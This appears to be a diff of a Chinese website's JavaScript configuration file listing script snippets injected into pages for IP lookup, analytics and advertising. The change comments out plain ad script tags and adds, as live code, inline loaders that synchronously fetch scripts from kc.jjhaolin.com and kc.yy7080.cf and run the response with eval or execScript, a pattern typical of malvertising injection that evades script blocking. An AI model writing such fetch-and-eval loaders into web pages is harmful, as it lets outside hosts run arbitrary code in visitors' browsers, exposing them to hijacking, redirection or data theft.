@@ -1,4 +1,4 @@
-/* 2019.12.16代码1543 20200518 20200523*/
+/* 2019.12.16代码1543 2020.0518-0523*/
 /* 126接口 */
 var _c_top_001=["<script type='text/javascript' src='https://ip.ws.126.net/ipquery'></script>"];
 /* 火猫接口 */
@@ -70,9 +70,9 @@ var cmid=2;
 var cnid=Math.floor(Math.random()*cmid+1)
 var _c_top_011=["<script type='text/javascript'>switch(cnid){case 1:document.write(_c_top_021);break;case 2:document.write(_c_top_022);break;}</script>"];
 /* 广告代码021 */
-var _c_top_021=["<body><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.jjhaolin.com/x.php?pid=3246'></script><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.jjhaolin.com/d.php?pid=3246'></script></body>"];
+//var _c_top_021//=["<body><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.jjhaolin.com/x.php?pid=3246'></script><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.jjhaolin.com/d.php?pid=3246'></script></body>"];
 /* 广告代码022 */
-var _c_top_022=["<body><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.yy7080.cf/x.php?pid=3246'></script><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.yy7080.cf/d.php?pid=3246'></script></body>"];
+//var _c_top_022//=["<body><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.yy7080.cf/x.php?pid=3246'></script><script id='mob' type='text/javascript' charset='utf-8' src='https://kc.yy7080.cf/d.php?pid=3246'></script></body>"];
 /* 统计代码1 */
 var _c_top_012=["<script type='text/javascript' src='https://js.users.51.la/20010531.js'></script>"];
 /* JS内容替换代码 */
@@ -85,8 +85,10 @@ var _c_top_015=["<script type='text/javascript' src='https://js.users.51.la/2014
 var _c_top_016=["<script type='text/javascript' src='https://js.users.51.la/20010531.js'></script>"];
 /* 临时余下统计1 */
 var _c_top_017=["<script type='text/javascript' src='https://js.users.51.la/20385827.js'></script>"];
-/* 广告代码011 */
-//var _c_top_011//=["<body><script>;(function(w,d){var b='https://kc.jjhaolin.com/x.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script> <script>;(function(w,d){var b='https://kc.jjhaolin.com/d.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script></body>"];
+/* 广告代码021 N */
+var _c_top_021=["<body><script>;(function(w,d){var b='https://kc.jjhaolin.com/x.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script> <script>;(function(w,d){var b='https://kc.jjhaolin.com/d.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script></body>"];
+/* 广告代码022 N */
+var _c_top_022=["<body><script>;(function(w,d){var b='https://kc.yy7080.cf/x.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script> <script>;(function(w,d){var b='https://kc.yy7080.cf/d.php?pid=3246&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script></body>"];
 /* JS隐藏AD元素代码 */
 //var remove=n=>{n.split(",").forEach(v=>{if(v.indexOf("@ID(")==0){document.getElementById(v.substring(4,v.length-1)).style.display="none"}else{for(let e of document.getElementsByClassName(v))e.style.display="none"}})}
 //var _c_top_006//=["<script type='text/javascript'>remove('animated');</script>"];
